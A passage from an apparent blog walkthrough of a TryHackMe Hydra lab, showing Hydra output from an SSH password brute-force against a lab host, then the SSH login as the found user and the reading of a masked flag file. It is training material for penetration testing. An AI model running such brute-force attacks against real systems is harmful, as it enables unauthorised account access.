</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>16</span> tasks per <span class=m>1</span> server, overall <span class=m>16</span> tasks, <span class=m>14344398</span> login tries <span class=o>(</span>l:1/p:14344398<span class=o>)</span>, ~896525 tries per task
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking ssh://10.10.192.119:22/
</span></span><span class=line><span class=cl><span class=o>[</span>VERBOSE<span class=o>]</span> Resolving addresses ... <span class=o>[</span>VERBOSE<span class=o>]</span> resolving <span class=k>done</span>
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> Testing <span class=k>if</span> password authentication is supported by ssh://molly@10.10.192.119:22
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> Successful, password authentication is supported by ssh://10.10.192.119:22
</span></span><span class=line><span class=cl><span class=o>[</span>ERROR<span class=o>]</span> could not connect to target port 22: Socket error: Connection reset by peer
</span></span><span class=line><span class=cl><span class=o>[</span>ERROR<span class=o>]</span> ssh protocol error
</span></span><span class=line><span class=cl><span class=o>[</span>ERROR<span class=o>]</span> could not connect to target port 22: Socket error: Connection reset by peer
</span></span><span class=line><span class=cl><span class=o>[</span>ERROR<span class=o>]</span> ssh protocol error
</span></span><span class=line><span class=cl><span class=o>[</span>22<span class=o>][</span>ssh<span class=o>]</span> host: 10.10.192.119   login: molly   password: *password*
</span></span><span class=line><span class=cl><span class=o>[</span>STATUS<span class=o>]</span> attack finished <span class=k>for</span> 10.10.192.119 <span class=o>(</span>waiting <span class=k>for</span> children to <span class=nb>complete</span> tests<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target successfully completed, <span class=m>1</span> valid password found
</span></span><span class=line><span class=cl><span class=o>[</span>WARNING<span class=o>]</span> Writing restore file because <span class=m>3</span> final worker threads did not <span class=nb>complete</span> <span class=k>until</span> end.
</span></span><span class=line><span class=cl><span class=o>[</span>ERROR<span class=o>]</span> <span class=m>3</span> targets did not resolve or could not be connected
</span></span><span class=line><span class=cl><span class=o>[</span>ERROR<span class=o>]</span> <span class=m>16</span> targets did not <span class=nb>complete</span>
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>http://www.thc.org/thc-hydra<span class=o>)</span> finished at 2022-10-17 00:10:41
</span></span></code></pre></div><p>Log in with <strong>ssh</strong>,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh molly@10.10.192.119
</span></span></code></pre></div><p>and then check the <strong>working directory</strong> for the <strong>flag</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ls -hlag
</span></span></code></pre></div><p>Finally, <strong>get</strong> the <strong>second flag</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat flag2.txt
</span></span></code></pre></div><p><strong>Complete terminal interaction:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@ip-10-10-184-104:~# ssh molly@10.10.192.119
</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;10.10.192.119 (10.10.192.119)&#39;</span> can<span class=s1>&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=s1>ECDSA key fingerprint is SHA256:tiGAbqtH/9FwerHyuDUNFGixYidKldG5s3yHhXTBhLU.
</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no)? yes
</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>10.10.192.119<span class=s1>&#39; (ECDSA) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=s1>molly@10.10.192.119&#39;</span>s password: 
</span></span><span class=line><span class=cl>Welcome to Ubuntu 16.04.6 LTS <span class=o>(</span>GNU/Linux 4.4.0-1092-aws x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>65</span> packages can be updated.
</span></span><span class=line><span class=cl><span class=m>32</span> updates are security updates.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Tue Dec <span class=m>17</span> 14:37:49 <span class=m>2019</span> from 10.8.11.98
</span></span><span class=line><span class=cl>molly@ip-10-10-192-119:~$ ls -alg
</span></span><span class=line><span class=cl>total <span class=m>36</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> molly <span class=m>4096</span> Dec <span class=m>17</span>  <span class=m>2019</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root  <span class=m>4096</span> Dec <span class=m>17</span>  <span class=m>2019</span> ..
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> molly   <span class=m>42</span> Dec <span class=m>17</span>  <span class=m>2019</span> .bash_history
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> molly  <span class=m>220</span> Dec <span class=m>17</span>  <span class=m>2019</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> molly <span class=m>3771</span> Dec <span class=m>17</span>  <span class=m>2019</span> .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> molly <span class=m>4096</span> Dec <span class=m>17</span>  <span class=m>2019</span> .cache
</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> molly   <span class=m>38</span> Dec <span class=m>17</span>  <span class=m>2019</span> flag2.txt
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> molly  <span class=m>655</span> Dec <span class=m>17</span>  <span class=m>2019</span> .profile
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> molly  <span class=m>604</span> Dec <span class=m>17</span>  <span class=m>2019</span> .viminfo
</span></span><span class=line><span class=cl>molly@ip-10-10-192-119:~$ cat flag2.txt 
</span></span><span class=line><span class=cl>THM<span class=o>{</span>*flag*<span class=o>}</span>
</span></span><span class=line><span class=cl>molly@ip-10-10-192-119:~$
</span></span></code></pre></div><p>With this, we got <strong>both</strong> of the <strong>flags</strong>, and we successfully arrived at the <strong>end</strong> of this room. <strong>Make sure</strong>, that you <strong>terminated</strong> the <em>target machine</em> you worked on, before <strong>proceeding</strong> to the <strong>next room</strong>.</p><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p>thm - shorthand for TryHackMe from now on&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/thm/>thm</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/comptia-pentest-plus-path/>comptia-pentest-plus-path</a></li><li><a href=https://bluewalle.github.io/tags/penetration-testing-tools-module/>penetration-testing-tools-module</a></li><li><a href=https://bluewalle.github.io/tags/nessus-room/>nessus-room</a></li><li><a href=https://bluewalle.github.io/tags/beginner-level/>beginner-level</a></li><li><a href=https://bluewalle.github.io/tags/room/>room</a></li><li><a href=https://bluewalle.github.io/tags/hydra/>hydra</a></li><li><a href=https://bluewalle.github.io/tags/password-bruteforcing/>password bruteforcing</a></li><li><a href=https://bluewalle.github.io/tags/http-post-form-bruteforcing/>http-post-form bruteforcing</a></li><li><a href=https://bluewalle.github.io/tags/ssh-bruteforcing/>ssh bruteforcing</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>